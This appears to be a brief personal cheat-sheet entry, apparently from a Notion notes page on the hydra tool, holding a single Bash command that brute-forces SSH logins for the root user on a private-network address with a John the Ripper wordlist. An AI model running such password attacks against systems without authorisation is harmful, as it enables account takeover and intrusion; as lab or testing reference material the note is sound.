  
[[Notion/Common Tools/hydra]]
```Bash
hydra -l root -P /opt/homebrew/Cellar/john-jumbo/1.9.0_1/share/john/password.lst -t 6 -vV -s 22 ssh://192.168.233.128
```